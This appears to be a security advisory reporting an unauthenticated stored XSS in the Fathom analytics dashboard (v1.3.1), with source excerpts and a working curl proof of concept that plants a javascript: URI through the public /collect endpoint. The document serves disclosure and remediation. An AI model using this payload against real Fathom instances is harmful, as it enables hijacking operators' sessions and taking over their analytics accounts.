https://github.com/usefathom/fathom - maintenance mode


## Finding: Unauthenticated stored XSS via /collect into the dashboard pages table

Affected Versions: confirmed on v1.3.1

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H

CWE: CWE-79 -- Improper Neutralization of Input During Web Page Generation (Stored XSS)


### Summary
The unauthenticated `/collect` tracking endpoint stores attacker-controlled hostname and pathname values verbatim. When an authenticated operator opens the analytics dashboard, the "Top pages" table builds an anchor `href` by concatenating these stored values and renders it with `<a href={href}>`. Because the values are never validated against a safe scheme, an attacker can store a `javascript:` URI. When the operator clicks the entry, arbitrary JavaScript executes in the dashboard origin. No authentication is needed to plant the payload.

### Details
Pageview data is ingested by the public collector with no authentication. The route is registered without the `Authorize` middleware:

`pkg/api/routes.go`
```
r.Handle("/collect", NewCollector(api.database)).Methods(http.MethodGet)
```

The collector copies the request query values into the pageview, normalizing them with `parseHostname` / `parsePathname`, which perform no scheme validation:

`pkg/api/collect.go`
```
pageview := &models.Pageview{
    ...
    Hostname: parseHostname(q.Get("h")),
    Pathname: parsePathname(q.Get("p")),
    ...
}

func parsePathname(p string) string {
    return "/" + strings.TrimLeft(strings.TrimRight(p, "/"), "/")
}

func parseHostname(r string) string {
    u, err := url.Parse(r)
    if err != nil {
        return ""
    }
    return u.Scheme + "://" + u.Host
}
```

`parseHostname("javascript://example.com")` returns the string `javascript://example.com`, and `parsePathname` preserves any character (including a newline) in the path. These values are stored and later aggregated into `page_stats` (the page-stats aggregation path uses `p.Hostname`/`p.Pathname` directly and does not re-validate them, unlike the referrer path which calls `parseReferrer`).

The authenticated dashboard fetches the aggregated rows and renders the sink in `assets/src/js/components/Table.js`:

```
let href = (p.Hostname + p.Pathname) || p.URL;
...
<div class="cell main-col"><a href={href}>{label}</a></div>
```

`href` becomes `Hostname + Pathname`, e.g. `javascript://example.com/\nalert(document.domain)`. The dashboard uses Preact 8 (`"preact": "^8.3.1"`), which renders the attribute value verbatim and does not sanitize `javascript:` URLs. When the operator clicks the link, the browser evaluates the URI body: `//example.com/` is a single-line JavaScript comment, the newline terminates it, and `alert(document.domain)` executes in the dashboard origin.

### PoC
Prerequisites: a running Fathom instance with at least one registered user (so the dashboard is private) and one site. The attacker needs only the public site tracking ID, which is embedded in every page's tracking snippet.

1. Plant the payload by calling the unauthenticated collector (replace `GSCLU` with the target site tracking ID). The `h` value sets the hostname, and the `p` value carries a leading newline so the eventual `javascript:` URI breaks out of the `//` comment:

```
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
printf -v P '\nalert(document.domain)//'
curl -s -A "$UA" -G "http://TARGET:8080/collect" \
  --data-urlencode "sid=GSCLU" \
  --data-urlencode "h=javascript://example.com" \
  --data-urlencode "p=$P" \
  --data-urlencode "nv=1" --data-urlencode "ns=1" --data-urlencode "u=1"
```

2. The value is stored verbatim and, after the aggregator processes it, appears in the page stats. The authenticated dashboard endpoint returns it:

```
$ curl -s -b cookies.txt "http://TARGET:8080/api/sites/1/stats/pages/agg?before=9999999999&after=1&offset=0&limit=15"
{
  "Data": [
    {
      "Hostname": "javascript://example.com",
      "Pathname": "/\nalert(document.domain)",
      "Pageviews": 3,
      ...
    },
    ...
  ]
}
```

3. The "Top pages" table renders this as an anchor. Rendering the exact API row through the project's pinned Preact version produces:

```
HREF VALUE: "javascript://example.com/\nalert(document.domain)"
RENDERED HTML:
<a href="javascript://example.com/
alert(document.domain)">javascript://example.com/
alert(document.domain)</a>
```

4. When the logged-in operator clicks the entry, the browser evaluates the `javascript:` URI body. The `//example.com/` prefix is a JS comment, the newline ends it, and the remainder runs in the dashboard origin (verified that the URI body evaluates to the payload):

```
$ node -e 'let out; eval("//example.com/\nout = \"XSS-\"+1"); console.log(out)'
XSS-1
```

### Impact
Any unauthenticated remote attacker who knows a site's public tracking ID (always present in the page's tracking snippet) can store a `javascript:` payload. When an authenticated Fathom operator views the dashboard and clicks the poisoned "Top pages" row, attacker JavaScript executes in the dashboard origin with the operator's session. This allows reading and exfiltrating the session cookie, creating or deleting sites and users through the authenticated API, and full control of the analytics account. The scope is changed because the injection originates from the public tracking surface but executes in the privileged dashboard context.
